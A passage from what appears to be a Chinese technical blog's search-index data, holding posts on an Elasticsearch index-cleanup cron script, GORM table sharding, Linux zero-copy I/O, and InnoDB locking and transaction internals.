/home/scripts/del_elasticseatch_index.sh`\n\n```bash\n#!/bin/bash\n#The index 30 days ago\ncurl -XGET 'http://localhost:9200/_cat/shards' |awk '{print $1}' |grep `date -d \"30 days ago\" +%Y.%m.%d` |uniq > /tmp/index_name.tmp\n\nfor index_name in `cat /tmp/index_name.tmp`  \ndo\n    curl -XDELETE  http://localhost:9200/$index_name\n    echo \"${index_name} delete success\" >> /home/scripts/del_elasticseatch_index.log\ndone\n\n```\n\n```bash\ncrontab -l\n0 3 * * * bash /home/scripts/del_elasticseatch_index.sh\n```\n\n\n\n# 4. 参考文档\n\n- https://doc.codingdict.com/elasticsearch\n- https://cloud.tencent.com/developer/article/1372542\n","tags":["elasticsearch"],"categories":["elk"]},{"title":"golang库gorm中mysql分表的使用","url":"%2Fp%2F4d89fe00.html","content":"\n# 1. 分表概念\n\n单表行数超过 500 万行或者单表容量超过 2GB，才推荐进行分库分表。\n\n<!-- more -->\n\n### 1.1 分表算法\n\n选定了分表字段之后，如何基于这个分表字段来准确的把数据分表到某一张表中呢?\n\n这就是分表算法要做的事情了，但是不管什么算法，我们都需要确保一个前提，那就是同一个分表字段，经过这个算法处理后，得到的结果一定是一致的，不可变的。\n\n通常情况下，当我们对 order 表进行分表的时候，比如我们要分成 128 张表的话，那么得到的 128 表应该是:order_0000、order_0001、order_0002.....order_0126、order_0127\n\n# 2. Gorm 分表中间件\n\n参考我的仓库： (<https://github.com/unix2dos/sharding>)\n\n在gorm分表中间件的基础上，修改了以下问题。\n\n- 修改了 DoubleWrite 开启后，查询也是双查的问题。(<https://github.com/go-gorm/sharding/issues/115>）\n- 修改了分表插件，不同表只能支持同一个分表配置的问题。\n\n### 2.1 使用\n\n```go\nfunc main() {  \n    db, _ := gorm.Open()  \n  \n    tableConfigs := make(map[string]sharding.Config, 0)  \n    tableConfigs[\"table_a\"] = sharding.Config{ShardingKey: \"user_id\", NumberOfShards: 128, PrimaryKeyGenerator: sharding.PKSnowflake, DoubleWrite: true}  \n    tableConfigs[\"table_b\"] = sharding.Config{ShardingKey: \"user_id\", NumberOfShards: 128, PrimaryKeyGenerator: sharding.PKSnowflake, DoubleWrite: true}  \n    tableConfigs[\"table_c\"] = sharding.Config{ShardingKey: \"user_id\", NumberOfShards: 16, PrimaryKeyGenerator: sharding.PKSnowflake, DoubleWrite: true}  \n    _ = db.Use(sharding.RegisterTablesConfigs(tableConfigs))  \n}\n```\n\n# 3. 参考资料\n\n- https://www.51cto.com/article/709614.html\n","tags":["golang"],"categories":["4_golang实战"]},{"title":"linux零拷贝技术讲解","url":"%2Fp%2F6aa20615.html","content":"\n磁盘可以说是计算机系统最慢的硬件之一，读写速度相差内存 10 倍以上，所以针对优化磁盘的技术非常的多，比如零拷贝、直接 I/O、异步 I/O 等等，这些优化的目的就是为了提高系统的吞吐量，另外操作系统内核中的磁盘高速缓存区，可以有效的减少磁盘的访问次数。\n\n<!-- more -->\n\n# 1. DMA\n\n### 1.1 DMA前（CPU参与搬运数据）\n\n在没有 DMA 技术前，I/O 的过程是这样的：\n\n- CPU 发出对应的指令给磁盘控制器，然后返回；\n- 磁盘控制器收到指令后，于是就开始准备数据，会把数据放入到磁盘控制器的内部缓冲区中，然后产生一个中断；\n- CPU 收到中断信号后，停下手头的工作，接着把磁盘控制器的缓冲区的数据一次一个字节地读进自己的寄存器，然后再把寄存器里的数据写入到内存，而在数据传输的期间 CPU 是无法执行其他任务的。\n\n<img src=\"linux零拷贝技术讲解/I_O中断.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n整个数据的传输过程，都要需要 CPU 亲自参与搬运数据的过程，而且这个过程，CPU 是不能做其他事情的。计算机科学家们发现了事情的严重性后，于是就发明了 DMA 技术，也就是直接内存访问（Direct Memory Access） 技术。\n\n### 1.2 引入DMA（减少CPU搬运）\n\n在进行 I/O 设备和内存的数据传输的时候，数据搬运的工作全部交给 DMA 控制器，而 CPU 不再参与任何与数据搬运相关的事情，这样 CPU 就可以去处理别的事务。\n\n<img src=\"linux零拷贝技术讲解/DRM_I_O 过程.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n具体过程：\n\n- 用户进程调用 read 方法，向操作系统发出 I/O 请求，请求读取数据到自己的内存缓冲区中，进程进入阻塞状态；\n- 操作系统收到请求后，进一步将 I/O 请求发送 DMA，然后让 CPU 执行其他任务；\n- DMA 进一步将 I/O 请求发送给磁盘；\n- 磁盘收到 DMA 的 I/O 请求，把数据从磁盘读取到磁盘控制器的缓冲区中，当磁盘控制器的缓冲区被读满后，向 DMA 发起中断信号，告知自己缓冲区已满；\n- DMA 收到磁盘的信号，将磁盘控制器缓冲区中的数据拷贝到内核缓冲区中，此时不占用 CPU，CPU 可以执行其他任务；\n- 当 DMA 读取了足够多的数据，就会发送中断信号给 CPU；\n- CPU 收到 DMA 的信号，知道数据已经准备好，于是将数据从内核拷贝到用户空间，系统调用返回；\n\n### 1.3 系统调用和数据拷贝\n\n从服务器获取文件的代码通常如下，一般会需要两个系统调用：\n\n```c\nread(file, tmp_buf, len);\nwrite(socket, tmp_buf, len);\n```\n\n<img src=\"linux零拷贝技术讲解/传统文件传输.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n首先，期间共发生了 4 次用户态与内核态的上下文切换，因为发生了两次系统调用，一次是 `read()` ，一次是 `write()`，每次系统调用都得先从用户态切换到内核态，等内核完成任务后，再从内核态切换回用户态。\n\n我们看这个文件传输的过程，我们只是搬运一份数据，结果却搬运了 4 次，过多的数据拷贝无疑会消耗 CPU 资源，大大降低了系统性能。\n\n所以，**要想提高文件传输的性能，就需要减少「用户态与内核态的上下文切换」和「内存拷贝」的次数**。\n\n# 2. 零拷贝\n\n零拷贝技术实现的方式通常有 2 种：mmap + write  和 sendfile。\n\n### 2.1 mmap 后 write（映射少了一次cpu拷贝）\n\n在前面我们知道，`read()` 系统调用的过程中会把内核缓冲区的数据拷贝到用户的缓冲区里，于是为了减少这一步开销，我们可以用 `mmap()` 替换 `read()` 系统调用函数。\n\n```c\nbuf = mmap(file, len);\nwrite(sockfd, buf, len);\n```\n\n`mmap()` 系统调用函数会直接把内核缓冲区里的数据「映射」到用户空间，这样，操作系统内核与用户空间就不需要再进行任何的数据拷贝操作。\n\n<img src=\"linux零拷贝技术讲解/mmap_write零拷贝.png\" alt=\"mmap + write 零拷贝\" style=\"zoom: 60%;\" />\n\n具体过程如下：\n\n- 应用进程调用了 `mmap()` 后，DMA 会把磁盘的数据拷贝到内核的缓冲区里。接着，应用进程跟操作系统内核「共享」这个缓冲区；\n- 应用进程再调用 `write()`，操作系统直接将内核缓冲区的数据拷贝到 socket 缓冲区中，这一切都发生在内核态，由 CPU 来搬运数据；\n- 最后，把内核的 socket 缓冲区里的数据，拷贝到网卡的缓冲区里，这个过程是由 DMA 搬运的。\n\n我们可以得知，通过使用 `mmap()` 来代替 `read()`， 可以减少一次数据拷贝的过程。\n\n但这还不是最理想的零拷贝，因为仍然需要通过 CPU 把内核缓冲区的数据拷贝到 socket 缓冲区里，而且仍然需要 4 次上下文切换，因为系统调用还是 2 次。\n\n### 2.2 sendfile （内核缓存直接到网卡）\n\n在 Linux 内核版本 2.1 中，提供了一个专门发送文件的系统调用函数 `sendfile()`，函数形式如下：\n\n```c\n#include <sys/socket.h>\nssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);\n```\n\n首先，它可以替代前面的 `read()` 和 `write()` 这两个系统调用，这样就可以减少一次系统调用，也就减少了 2 次上下文切换的开销。\n\n从 Linux 内核 `2.4` 版本开始起，对于支持网卡支持 SG-DMA 技术的情况下， `sendfile()` 系统调用的过程发生了点变化，具体过程如下：这个过程之中，只进行了 2 次数据拷贝。\n\n- 第一步，通过 DMA 将磁盘上的数据拷贝到内核缓冲区里；\n- 第二步，缓冲区描述符和数据长度传到 socket 缓冲区，这样网卡的 SG-DMA 控制器就可以直接将内核缓存中的数据拷贝到网卡的缓冲区里，此过程不需要将数据从操作系统内核缓冲区拷贝到 socket 缓冲区中，这样就减少了一次数据拷贝；\n\n\n\n<img src=\"linux零拷贝技术讲解/senfile-零拷贝.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n这就是所谓的零拷贝（Zero-copy）技术，因为我们没有在内存层面去拷贝数据，也就是说全程没有通过 CPU 来搬运数据，所有的数据都是通过 DMA 来进行传输的。\n\n零拷贝技术的文件传输方式相比传统文件传输的方式，减少了 2 次上下文切换和数据拷贝次数，只需要 2 次上下文切换和数据拷贝次数，就可以完成文件的传输，而且 2 次的数据拷贝过程，都不需要通过 CPU，2 次都是由 DMA 来搬运。\n\n所以，总体来看，零拷贝技术可以把文件传输的性能提高至少一倍以上。\n\n# 3. 头脑风暴\n\n### 3.1 使用零拷贝技术的项目\n\n事实上，Kafka 这个开源项目，就利用了「零拷贝」技术，从而大幅提升了 I/O 的吞吐率，这也是 Kafka 在处理海量数据为什么这么快的原因之一。\n\n如果你追溯 Kafka 文件传输的代码，你会发现，最终它调用了 Java NIO 库里的 `transferTo` 方法，如果 Linux 系统支持 `sendfile()` 系统调用，那么 `transferTo()` 实际上最后就会使用到 `sendfile()` 系统调用函数。\n\n另外，Nginx 也支持零拷贝技术，一般默认是开启零拷贝技术，这样有利于提高文件传输的效率，是否开启零拷贝技术的配置如下：\n\n```bash\nhttp {\n...\n    sendfile on\n...\n}\n```\n\nsendfile 配置的具体意思:\n\n- 设置为 on 表示，使用零拷贝技术来传输文件：sendfile ，这样只需要 2 次上下文切换，和 2 次数据拷贝。\n- 设置为 off 表示，使用传统的文件传输技术：read + write，这时就需要 4 次上下文切换，和 4 次数据拷贝。\n\n### 3.2 传输大文件不要零拷贝\n\n传输大文件的时候，由于大文件难以命中 PageCache 缓存，而且会占满 PageCache 导致「热点」文件无法充分利用缓存，从而增大了性能开销，因此，这时应该使用直接 I/O。\n\n所以，传输文件的时候，我们要根据文件的大小来使用不同的方式：\n\n- 传输大文件的时候，使用「异步 I/O + 直接 I/O」；\n- 传输小文件的时候，则使用「零拷贝技术」；\n\n在 nginx 中，我们可以用如下配置，来根据文件的大小来使用不同的方式：\n\n```js\nlocation /video/ { \n    sendfile on; \n    aio on; \n    directio 1024m; \n}\n```\n\n当文件大小大于 `directio` 值后，使用「异步 I/O + 直接 I/O」，否则使用「零拷贝技术」。\n\n\n\n### 3.3 总结\n\n- 没有零拷贝会发生 4 次拷贝。DMA 从磁盘到内核缓存，内核到用户缓存，用户缓存到 Socket 缓存，Socket 缓存到网卡。\n- mmap（内核缓存和用户缓存映射）+write，减少一次 cpu 拷贝。\n- sendfile 给 socket 发送描述符和长度，内核缓存直接到网卡。\n\n\n\n# 4. 参考资料\n\n+ https://www.xiaolincoding.com/os/8_network_system/zero_copy.html\n","tags":["linux"],"categories":["系统"]},{"title":"mysql的锁和事务机制","url":"%2Fp%2F9762ea3e.html","content":"\n# 1. mysql的锁\n\n### 1.1 不同数据库的锁实现\n\n对于MyISAM引擎，其锁是表锁设计。并发情况下的读没有问题，但是并发插入时的性能就要差一些了。Microsoft SQL Server开始支持乐观并发和悲观并发，在乐观并发下开始支持行级锁，但是其实现方式与InnoDB存储引擎的实现方式完全不同。用户会发现在Microsoft SQL Server下，锁是一种稀有的资源，锁越多开销就越大，因此它会有锁升级。在这种情况下，行锁会升级到表锁，这时并发的性能又回到了以前。\n\n<!-- more -->\n\n### 1.2 行锁\n\nInnoDB 存储引擎实现了如下两种标准的行级锁：\n\n+ 共享锁（S Lock），允许事务读一行数据。\n\n+ 排他锁（X Lock），允许事务删除或更新一行数据。\n\n如果一个事务T1已经获得了行r的共享锁，那么另外的事务T2可以立即获得行r的共享锁，因为读取并没有改变行r的数据，称这种情况为锁兼容（Lock Compatible）。但若有其他的事务T3想获得行r的排他锁，则其必须等待事务T1、T2释放行r上的共享锁——这种情况称为锁不兼容。\n\nX 锁与任何的锁都不兼容，而 S 锁仅和 S 锁兼容。需要特别注意的是，S 和 X 锁都是行锁，兼容是指对同一记录（row）锁的兼容性情况。\n\n### 1.3 意向锁（和其他锁可共存）\n\nInnoDB存储引擎支持多粒度（granular）锁定，**这种锁定允许事务在行级上的锁和表级上的锁同时存在。**为了支持在不同粒度上进行加锁操作，InnoDB存储引擎支持一种额外的锁方式，称之为意向锁（Intention Lock）。意向锁是将锁定的对象分为多个层次，意向锁意味着事务希望在更细粒度（fine granularity）上进行加锁。\n\n\n\nInnoDB存储引擎支持意向锁设计比较简练，其意向锁即为表级别的锁。设计目的主要是为了在一个事务中揭示下一行将被请求的锁类型。其支持两种意向锁：\n\n1）意向共享锁（IS Lock），事务想要获得一张表中某几行的共享锁\n\n2）意向排他锁（IX Lock），事务想要获得一张表中某几行的排他锁\n\n<img src=\"mysql的锁和事务机制/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n若将上锁的对象看成一棵树，那么对最下层的对象上锁，也就是对最细粒度的对象进行上锁，那么首先需要对粗粒度的对象上锁。\n\n例如图6-3，如果需要对页上的记录r进行上X锁，那么分别需要对数据库A、表、页上意向锁IX，最后对记录r上X锁。若其中任何一个部分导致等待，那么该操作需要等待粗粒度锁的完成。举例来说，在对记录r加X锁之前，已经有事务对表1进行了S表锁，那么表1上已存在S锁，之后事务需要对记录r在表1上加上IX，由于不兼容，所以该事务需要等待表锁操作的完成。\n\n### 1.4 行锁和意向锁的兼容\n\n| 锁                 | 类别       | 使用                                                  |\n| ------------------ | ---------- | ----------------------------------------------------- |\n| 共享锁 (S 锁)      | 行锁(读锁) | select * from table where id = 1 lock  in share mode; |\n| 排它锁 (X 锁)      | 行锁(写锁) | select * from table where id = 1 for update;          |\n| 意向共享锁 (IS 锁) | 表锁       | 数据引擎自己维护,用户无法手动操作                     |\n| 意向排他锁 (IX 锁) | 表锁       | 数据引擎自己维护,用户无法手动操作                     |\n\n+ 兼容性\n\n|      | IS   | IX   |\n| ---- | ---- | ---- |\n| IS   | 兼容 | 兼容 |\n| IX   | 兼容 | 兼容 |\n\n|      | S    | X    |\n| ---- | ---- | ---- |\n| IS   | 兼容 | 互斥 |\n| IX   | 互斥 | 互斥 |\n\n### 1.5 锁升级\n\nInnoDB存储引擎不存在锁升级的问题。因为其不是根据每个记录来产生行锁的，相反，其根据每个事务访问的每个页对锁进行管理的，采用的是位图的方式。因此不管一个事务锁住页中一个记录还是多个记录，其开销通常都是一致的。\n\n假设一张表有3 000 000个数据页，每个页大约有100条记录，那么总共有300 000 000条记录。若有一个事务执行全表更新的SQL语句，则需要对所有记录加X锁。若根据每行记录产生锁对象进行加锁，并且每个锁占用10字节，则仅对锁管理就需要差不多需要3GB的内存。\n\n而InnoDB存储引擎根据页进行加锁，并采用位图方式，假设每个页存储的锁信息占用30个字节，则锁对象仅需90MB的内存。由此可见两者对于锁资源开销的差距之大。\n\n# 2. 锁定度和非锁定读\n\n### 2.1 非一致性读(普通select)\n\n就是普通的 SELECT 语句(没有加锁后缀)， innodb 不会加锁， 就算别人锁了你也可以读。\n\nInnoDB存储引擎通过行多版本控制（multi versioning）的方式来读取当前执行时间数据库中行的数据。如果读取的行正在执行DELETE或UPDATE操作，这时读取操作不会因此去等待行上锁的释放。相反地，InnoDB存储引擎会去读取行的一个快照数据。\n\n<img src=\"mysql的锁和事务机制/2.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n非锁定读，因为不需要等待访问的行上X锁的释放。快照数据是指该行的之前版本的数据，该实现是通过undo段来完成。而undo用来在事务中回滚数据，因此快照数据本身是没有额外的开销。此外，读取快照数据是不需要上锁的，因为没有事务需要对历史的数据进行修改操作。\n\n非锁定读机制极大地提高了数据库的并发性。在InnoDB存储引擎的默认设置下，这是默认的读取方式，即读取不会占用和等待表上的锁。并不是在每个事务隔离级别下都是采用非锁定的一致性读。\n\n快照数据其实就是当前行数据之前的历史版本，每行记录可能有多个版本。就图6-4所显示的，一个行记录可能有不止一个快照数据，一般称这种技术为行多版本技术。由此带来的并发控制，称之为多版本并发控制（Multi Version Concurrency Control，MVCC）。\n\n\n\n**RC 和 RR 级别非一致性读的区别**\n\n在事务隔离级别READ COMMITTED和REPEATABLE READ（InnoDB存储引擎的默认事务隔离级别）下，InnoDB存储引擎使用非锁定的一致性读。然而，对于快照数据的定义却不相同**。**\n\n在READ COMMITTED事务隔离级别下，对于快照数据，非一致性读总是读取被锁定行的最新一份快照数据。而在REPEATABLE READ事务隔离级别下，对于快照数据，非一致性读总是读取事务开始时的行数据版本。\n\n\n\n- session A\n\n```\nSELECT*FROM parent WHERE id=1;\n\n1\n```\n\n- session B\n\n```\nUPDATE parent SET id=3 WHERE id=1;\n```\n\n在会话 B 中将事务表 parent 中 id 为 1 的记录修改为 id=3，但是事务同样没有提交，这样 id=1 的行其实加了一个 X 锁。\n\n回到之前的会话 A，接着上次未提交的事务，执行 SQL 语句 `SELECT*FROM parent WHERE id=1` 的操作，这时不管使用 READ COMMITTED 还是 REPEATABLE READ 的事务隔离级别，显示的数据应该都是 1。\n\n- session A\n\n```\nSELECT*FROM parent WHERE id=1;\n\n1\n```\n\n- session B\n\n```\ncommit\n```\n\n在会话 B 提交事务后，这时在会话 A 中再运行 `SELECT*FROM parent WHERE id=1 ` 的 SQL 语句。\n对于 READ COMMITTED 的事务隔离级别，它总是读取行的最新版本。（其他事务修改后的值，读到的是NULL，应该被改了）\n对于 REPEATABLE READ 的事务隔离级别，总是读取事务开始时的行数据。（当前事务最初的值，读到的还是1）\n\n### 2.2 一致性读（select后面加锁语法查询）\n\n即使是对于SELECT的只读操作。InnoDB存储引擎对于SELECT语句支持两种一致性的锁定读（locking read）操作：\n\n+ SELECT…FOR UPDATE\n\n+ SELECT…LOCK IN SHARE MODE\n\nSELECT…FOR UPDATE 对读取的行记录加一个 X 锁，其他事务不能对已锁定的行加上任何锁。SELECT…LOCK IN SHARE MODE 对读取的行记录加一个 S 锁，其他事务可以向被锁定的行加 S 锁，但是如果加 X 锁，则会被阻塞。\n\n对于一致性非锁定读，即使读取的行已被执行了SELECT…FOR UPDATE，也是可以进行读取的，这和之前讨论的情况一样。\n\nSELECT…FOR UPDATE，SELECT…LOCK IN SHARE MODE必须在一个事务中，当事务提交了，锁也就释放了。因此在使用上述两句SELECT锁定语句时，务必加上BEGIN，START TRANSACTION或者SET AUTOCOMMIT=0。\n\n# 3.行锁算法\n\n### 3.1 行锁的 3 种算法\n\nInnoDB 存储引擎有 3 种行锁的算法，其分别是：\n\n+ Record Lock：单个行记录上的锁。\n\n+ Gap Lock：间隙锁，锁定一个范围，但不包含记录本身。\n\n+ Next-Key Lock∶   Gap Lock+Record Lock，锁定一个范围，并且锁定记录本身。\n\nRecord Lock 总是会去锁住索引记录，如果 InnoDB 存储引擎表在建立的时候没有设置任何一个索引，那么这时 InnoDB 存储引擎会使用隐式的主键来进行锁定。\n\n在Next-Key Lock算法下，InnoDB对于行的查询都是采用这种锁定算法。例如一个索引有10，11，13和20这四个值，那么该索引可能被Next-Key Locking的区间为：\n\n```bash\n(-∞,10]\n(10,11]\n(11,13]\n(13，20]\n(20,+∞)\n```\n\n当查询的索引含有唯一属性时，InnoDB存储引擎会对Next-Key Lock进行优化，将其降级为Record Lock，即仅锁住索引本身，而不是范围。\n\n**行锁举例**\n\n```sql\nCREATE TABLE t(a INT PRIMARY KEY);\nINSERT INTO t SELECT 1;\nINSERT INTO t SELECT 2;\nINSERT INTO t SELECT 5;\n\nSELECT * FROM t WHERE a = 5 FOR UPDATE;\nINSERT INTOt SELECT 4; # 可以插入\n```\n\n\n\n表t共有1、2、5三个值。在上面的例子中，在会话A中首先对a=5进行X锁定。而由于a是主键且唯一，因此锁定的仅是5这个值，这样在会话B中插入值4而不会阻塞，可以立即插入并返回。即锁定由Next-Key Lock算法降级为了Record Lock，从而提高应用的并发性。\n\n\n\nNext-Key Lock降级为Record Lock仅在查询的列是唯一索引的情况下。若是辅助索引，则情况会完全不同。\n\n```sql\nCREATE TABLE z(a INT,b INT,PRIMARY KEY(a),KEY(b));\nINSERT INTO z SELECT 1,1;\nINSERT INTO z SELECT 3,1;\nINSERT INTO z SELECT 5,3;\nINSERT INTO z SELECT 7,6;\nINSERT INTO z SELECT 10,8;\n\n(-无穷,1](1,3](3,6](6,8](8,+无穷)\n\nSELECT*FROM z WHERE b=3 FOR UPDATE;\n\n```\n\n由于有两个索引，其需要分别进行锁定。\n\n对于聚集索引，其仅对列a等于5的索引加上Record Lock。而对于辅助索引，其加上的是Next-Key Lock，锁定的范围是(1，3)，特别需要注意的是，InnoDB存储引擎还会对辅助索引下一个键值加上gap lock，即还有一个辅助索引范围为(3，6)的锁。因此，若在新会话B中运行下面的SQL语句，都会被阻塞：\n\n```sql\nSELECT*FROM z WHERE a=5 LOCK IN SHARE MODE; # 已经对聚集索引中列a=5的值加上X锁，因此执行会被阻塞。\nINSERT INTO z SELECT 4,2; # 但是插入的辅助索引值2在锁定的范围(1，3)中，因此执行同样会被阻塞。\nINSERT INTO z SELECT 6,5; # 插入的值5在另一个锁定的范围(3，6)中，故同样需要等待。\n```\n\n\n\n而下面的SQL语句，不会被阻塞，可以立即执行：\n\n```sql\nINSERT INTO z SELECT 8,6;\nINSERT INTO z SELECT 2,0;\nINSERT INTO z SELECT 6,7;\n```\n\n\n\n**间隙锁**\n\n在InnoDB存储引擎中，对于INSERT的操作，其会检查插入记录的下一条记录是否被锁定，若已经被锁定，则不允许查询。对于上面的例子，会话A已经锁定了表z中b=3的记录，即已经锁定了(1，3)的范围，这时若在其他会话中进行如下的插入同样会导致阻塞：\n\n```sql\nSELECT*FROM z WHERE b=3 FOR UPDATE;\n\nINSERT INTO z SELECT 2,2; # 阻塞\n\nINSERT INTO z SELECT 2,0; # 可以执行\n```\n\n\n\n对于唯一键值的锁定，Next-Key Lock降级为Record Lock仅存在于查询所有的唯一索引列。若唯一索引由多个列组成，而查询仅是查找多个唯一索引列中的其中一个，那么查询其实是range类型查询，而不是point类型查询，故InnoDB存储引擎依然使用Next-Key Lock进行锁定。\n\n### 3.2 RR 用 Next-Key Locking 解决幻读\n\n即 REPEATABLE READ 下，InnoDB 存储引擎采用 Next-Key Locking 机制来避免 Phantom Problem（幻像问题）。这点可能不同于与其他的数据库，如 Oracle 数据库，因为其可能需要在 SERIALIZABLE 的事务隔离级别下才能解决 Phantom Problem。\n\n\n\n表 t 由 1、2、5 这三个值组成，对于 SQL 语句 `SELECT*FROM t WHERE a＞2 FOR UPDATE`，其锁住的不是 5 这单个值，而是对（2，+∞）这个范围加了 X 锁。因此任何对于这个范围的插入都是不被允许的，从而避免 Phantom Problem。\n\n\n\nInnoDB存储引擎默认的事务隔离级别是REPEATABLE READ，在该隔离级别下，其采用Next-Key Locking的方式来加锁。而在事务隔离级别READ COMMITTED下，其仅采用Record Lock。\n\n\n\n# 4. 事务问题\n\n### 4.1 脏读\n\n脏读指的就是在不同的事务下，当前事务可以读到另外事务未提交的数据，简单来说就是可以读到脏数据。违反了事务的隔离性。\n\n脏读现象在生产环境中并不常发生，从上面的例子中就可以发现，脏读发生的条件是需要事务的隔离级别为READ UNCOMMITTED，而目前绝大部分的数据库都至少设置成READ COMMITTED。\n\n\n\n### 4.2 不可重复读\n\n不可重复读是指在一个事务内多次读取同一数据集合。在这个事务还没有结束时，另外一个事务也访问该同一数据集合，并做了一些DML操作。\n\n在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的情况，这种情况称为不可重复读。其违反了数据库事务一致性的要求。\n\n\n\n不可重复读和脏读的区别是：脏读是读到未提交的数据，而不可重复读读到的却是已经提交的数据（提交是指别的事务 commit）。\n\n\n\n在 InnoDB 存储引擎中，通过使用 Next-Key Lock 算法来避免不可重复读的问题。在 MySQL 官方文档中将不可重复读的问题定义为 Phantom Problem，即幻像问题。\n\n在 Next-Key Lock 算法下，对于索引的扫描，不仅是锁住扫描到的索引，而且还锁住这些索引覆盖的范围（gap）。因此在这个范围内的插入都是不允许的。这样就避免了另外的事务在这个范围内插入数据导致的不可重复读的问题。\n\n因此，InnoDB存储引擎的默认事务隔离级别是READ REPEATABLE，采用Next-Key Lock算法，避免了不可重复读的现象。\n\n### 4.3 丢失更新\n\nmysql丢失更新问题英文叫lost update。指的是两个事务同时更新一条数据，后更新的覆盖了前面更新的结果，从结果上看第一次的更新丢失了的现象。脏读，幻读，不可重复读是读的问题，丢失更新是写的问题。\n\n其实现在数据库本身并没有丢失更新的问题，因为当一个事务更新一条记录时，就会加排他锁，另外一个的更新就会阻塞住。所以丢失更新大多是业务本身的问题。\n\n\n\n+ 悲观锁解决\n\n```sql\nbegin;\n// 所有的会话都并发执行这个SQL，只有一个可以获取 X 锁成功，其他的都等待\nselect id, name, balance from account where id = 1 for update;\n// 假设返回：balance = 100;\n\n// 应用代码：balance += 10;  balance = 110\nupdate account set balance = 110 where id = 1;\ncommit;\n```\n\n\n\n+ 调整更新策略解决\n\n```sql\nbegin;\n// 执行快照读\nselect id, balance from account where id = 1;\n// 这个数据有可能会被其他的并发更新给修改掉，不一定是最新的数据\n\n// 执行update操作，注意这里的不同，是直接对余额做 增/减 操作，\n//  利用一致性读视图在update时执行当前读的特点，也就是说如果有多个会话执行 update，其余的会被阻塞\nupdate account set balance = balance + 10 where id = 1;\ncommit;\n```\n\n# 5. mysql的事务\n\nInnoDB存储引擎中的事务完全符合ACID的特性。ACID是以下4个词的缩写：\n\n+ 原子性（atomicity）\n\n+ 一致性（consistency） \n\n+ 隔离性（isolation）  // 锁主要解决的问题\n\n+ 持久性（durability)\n\n### 5.1 事务分类\n\n对于InnoDB存储引擎来说，其支持扁平事务、带有保存点的事务、链事务、分布式事务。\n\n+ 扁平事务（Flat Transaction）是事务类型中最简单的一种，但在实际生产环境中，这可能是使用最为频繁的事务。在扁平事务中，所有操作都处于同一层次，其由BEGIN WORK开始，由COMMIT WORK或ROLLBACK WORK结束，其间的操作是原子的，要么都执行，要么都回滚。\n+ 分布式事务（Distributed Transactions）通常是一个在分布式环境下运行的扁平事务，因此需要根据数据所在位置访问网络中的不同节点。节点A不能通过调用一台数据库就完成任务。其需要访问网络中两个节点的数据库，而在每个节点的数据库执行的事务操作又都是扁平的。对于分布式事务，其同样需要满足ACID特性，要么都发生，要么都失效。\n\n### 5.2 事务的实现\n\n事务隔离性由锁来实现。原子性、一致性、持久性通过数据库的redo log和undo log来完成。**redo log称为重做日志，用来保证事务的原子性和持久性。undo log用来保证事务的一致性。（mvcc）**\n\n有的DBA或许会认为undo是redo的逆过程，其实不然。redo和undo的作用都可以视为是一种恢复操作，redo恢复提交事务修改的页操作，而undo回滚行记录到某个特定版本。因此两者记录的内容不同，redo通常是物理日志，记录的是页的物理修改操作。undo是逻辑日志，根据每行记录进行记录。\n\n### 5.3 redo log \n\n**redo log 和 undo log的区别**\n\nredo log用来保证事务的持久性，undo log用来帮助事务回滚及MVCC的功能。redo log基本上都是顺序写的，在数据库运行时不需要对redo log的文件进行读取操作。而undo log是需要进行随机读写的。\n\n**redo log 和 bin log的区别**\n\nMySQL数据库中还有一种二进制日志（binlog），其用来进行POINT-IN-TIME（PIT）的恢复及主从复制（Replication）环境的建立。从表面上看其和重做日志非常相似，都是记录了对于数据库操作的日志。然而，从本质上来看，两者有着非常大的不同。\n\n首先，重做日志是在InnoDB存储引擎层产生，而二进制日志是在MySQL数据库的上层产生的，并且二进制日志不仅仅针对于InnoDB存储引擎，MySQL数据库中的任何存储引擎对于数据库的更改都会产生二进制日志。\n\n其次，两种日志记录的内容形式不同。MySQL数据库上层的二进制日志是一种逻辑日志，其记录的是对应的SQL语句。而InnoDB存储引擎层面的重做日志是物理格式日志，其记录的是对于每个页的修改。\n\n**恢复**\n\nInnoDB存储引擎在启动时不管上次数据库运行时是否正常关闭，都会尝试进行恢复操作。因为重做日志记录的是物理日志，因此恢复的速度比逻辑日志，如二进制日志，要快很多。\n\nINSERT操作在二进制日志中就不是幂等的，重复执行可能会插入多条重复的记录。而上述INSERT操作的重做日志是幂等的。\n\n\n\n### 5.4 undo log\n\n用户通常对undo有这样的误解：undo用于将数据库物理地恢复到执行语句或事务之前的样子——但事实并非如此。\n\n用户执行了一个INSERT 10W条记录的事务，这个事务会导致分配一个新的段，即表空间会增大。在用户执行ROLLBACK时，会将插入的事务进行回滚，但是表空间的大小并不会因此而收缩。因此，当InnoDB存储引擎回滚时，它实际上做的是与先前相反的工作。对于每个INSERT，InnoDB存储引擎会完成一个DELETE；对于每个DELETE，InnoDB存储引擎会执行一个INSERT；对于每个UPDATE，InnoDB存储引擎会执行一个相反的UPDATE，将修改前的行放回去。\n\n除了回滚操作，undo的另一个作用是MVCC，即在InnoDB存储引擎中MVCC的实现是通过undo来完成。当用户读取一行记录时，若该记录已经被其他事务占用，当前事务可以通过undo读取之前的行版本信息，以此实现非锁定读取。\n\n最后也是最为重要的一点是，undo log会产生redo log，也就是undo log的产生会伴随着redo log的产生，这是因为undo log也需要持久性的保护。\n\n\n\n### 5.5 innodb事务隔离级别\n\n| 类型                         | 备注                                                         |\n| ---------------------------- | ------------------------------------------------------------ |\n| Read Uncommitted(RU)未提交读 | 不加锁                                                       |\n| Read Committed(RC)已提交读   | 解决脏读                                                     |\n| Repeatable Read(RR)可重复读  | 解决脏读，不可重复读，innodb 还解决了幻读(因为间隙锁不让别人插入)，默认级别 |\n| Serializable(SE) 串行化      | select隐式转为lock in share mode, 会和 update,delete 互斥  解决脏读, 不可重复读, 幻读 |\n\nInnoDB存储引擎默认支持的隔离级别是REPEATABLE READ，但是与标准SQL不同的是，InnoDB存储引擎在REPEATABLE READ事务隔离级别下，使用Next-Key Lock锁的算法，因此避免幻读的产生。这与其他数据库系统（如Microsoft SQL Server数据库）是不同的。所以说，InnoDB存储引擎在默认的REPEATABLE 